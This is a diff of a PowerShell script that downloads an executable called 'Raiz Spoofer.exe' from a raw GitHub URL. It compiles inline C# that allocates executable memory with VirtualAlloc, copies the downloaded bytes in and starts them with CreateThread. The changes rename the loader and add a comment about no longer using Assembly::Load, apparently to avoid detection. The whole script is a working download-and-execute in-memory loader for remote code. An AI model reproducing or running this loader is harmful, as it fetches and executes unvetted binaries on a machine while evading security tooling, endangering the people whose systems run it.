@@ -1,14 +1,13 @@
 $url = "https://raw.githubusercontent.com/tyu0720gyi/service/main/Raiz%20Spoofer.exe"
 
-
-$NativeLoader = @"
+$NativeSource = @"
 using System;
 using System.Runtime.InteropServices;
-public class Runner {
-    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint allocType, uint prot);
-    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, out uint id);
-    [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr handle, uint ms);
-    public static void Start(byte[] data) {
+public class NativeRunner {
+    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+    [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+    public static void Run(byte[] data) {
         IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)data.Length, 0x3000, 0x40);
         Marshal.Copy(data, 0, p, data.Length);
         uint id;
@@ -19,16 +18,16 @@ public class Runner {
 "@
 
 try {
-    Write-Host "[*] Action: Downloading C++ Binary..." -ForegroundColor Cyan
+    Write-Host "[STEP 1] Downloading C++ Binary..." -ForegroundColor Cyan
     $bin = (New-Object System.Net.WebClient).DownloadData($url)
     
-    Write-Host "[*] Action: Mapping Native Memory..." -ForegroundColor Cyan
-    Add-Type -TypeDefinition $NativeLoader
+    Write-Host "[STEP 2] Injecting into Native Memory..." -ForegroundColor Cyan
+    Add-Type -TypeDefinition $NativeSource
     
-
-    [Runner]::Start($bin)
+    # IMPORTANT: We are NOT using [Assembly]::Load anymore.
+    [NativeRunner]::Run($bin)
     
-    Write-Host "[+] Result: Executed Successfully!" -ForegroundColor Green
+    Write-Host "[DONE] Spoofer should be running now." -ForegroundColor Green
 } catch {
-    Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[-] FATAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
 }
